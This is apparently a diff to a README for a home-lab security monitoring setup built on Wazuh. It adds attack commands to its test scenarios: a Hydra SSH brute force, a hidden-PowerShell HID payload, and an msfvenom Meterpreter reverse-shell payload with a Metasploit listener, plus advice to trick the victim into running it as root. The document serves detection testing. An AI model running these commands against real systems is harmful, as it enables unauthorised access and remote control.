@@ -74,16 +74,30 @@ The core logic for our SOC resides in the Wazuh Manager. Apply these configurati
 Once the environment is fully configured and the agents are connected, you can run the following attack scenarios to test the SOC detection and prevention capabilities:
 
 ### Scenario A: Brute Force Attack
-1. From the Kali Linux machine, launch a dictionary attack against the Ubuntu machine using Hydra
-2. **Expected Result:** Wazuh will correlate the failed login attempts. Upon reaching the threshold (3 attempts in 120 seconds), Rule `111111` will trigger, and the Active Response will execute `firewall-drop` to block the Kali IP for 180 seconds.
+1. From the Kali Linux machine, create password list & username list .txt file (You can use big huge wordlist but its not neccesary, in this case we only want to test the SIEM security. So create smaller wordlist is more efficient)
+2. Run the hydra to target the SSH service (In this case It's Ubuntu)
+hydra -L [usernamelist.txt] -P [passwordlist.txt] ssh://[UBUNTU IP] -t 1
+3. **Expected Result:** Wazuh will correlate the failed login attempts. Upon reaching the threshold (3 attempts in 120 seconds), Rule `111111` will trigger, and the Active Response will execute `firewall-drop` to block the Kali IP for 180 seconds.
 
 ### Scenario B: HID Device Attack (Digispark Attiny85)
-1. Plug the programmed Digispark Attiny85 into the Windows victim machine.
-2. The payload will execute a hidden PowerShell window to bypass execution policies (`-WindowStyle hidden -ep bypass`).
-3. **Expected Result:** Sysmon will capture the process creation. Wazuh will trigger Rule `100102` (CRITICAL), identifying potential rogue keystroke injection.
+1. Create your own programmed Digispark Attiny85 with Arduino IDE to run malicious powershell script. Or use our code
+2. Plug the programmed Digispark Attiny85 into the Windows victim machine.
+3. The payload will execute a hidden PowerShell window to bypass execution policies (`-WindowStyle hidden -ep bypass`).
+4. **Expected Result:** Sysmon will capture the process creation. Wazuh will trigger Rule `100102` (CRITICAL), identifying potential rogue keystroke injection.
 
 ### Scenario C: RCE with Metasploit
-1. Generate an ELF payload using `msfvenom` and host it on the Kali machine.
-2. Trick the Ubuntu victim into downloading the payload into the `Downloads` directory and executing it.
-3. The payload will attempt to initiate a reverse shell connection back to the Kali machine.
-4. **Expected Result:** Suricata will flag the ELF download. Auditd will catch the outbound connection from the user-controlled directory. Wazuh will correlate both events (Rule `111112`), flagging an Attack Chain and dropping the connection via Active Response.
+1. Generate an ELF payload using `msfvenom` and host it on the Kali machine (make sure pick the right architecture).
+msfvenom -p linux/aarch64/meterpreter/reverse_tcp LHOST=[] LPORT=[] -f elf -o [thefilename.elf]
+2. Set up the listener on the Kali machine with this command
+msfconsole
+use exploit/multi/handler
+set payload linux/aarch64/meterpreter/reverse_tcp
+set LHOST [Your Kali IP]
+set LPORT [the port (4444, or you can use any ports you want)]
+
+3. Trick the Ubuntu victim into downloading the payload and executing it. And also make sure they run the .elf file with the Root priviledge. Try with this command :
+chmod +x [thefilename.elf]
+./thefilename.elf
+
+4. The payload will attempt to initiate a reverse shell connection back to the Kali machine.
+5. **Expected Result:** Suricata will flag the ELF download. Auditd will catch the outbound connection from the user-controlled directory. Wazuh will correlate both events (Rule `111112`), flagging an Attack Chain and dropping the connection via Active Response.
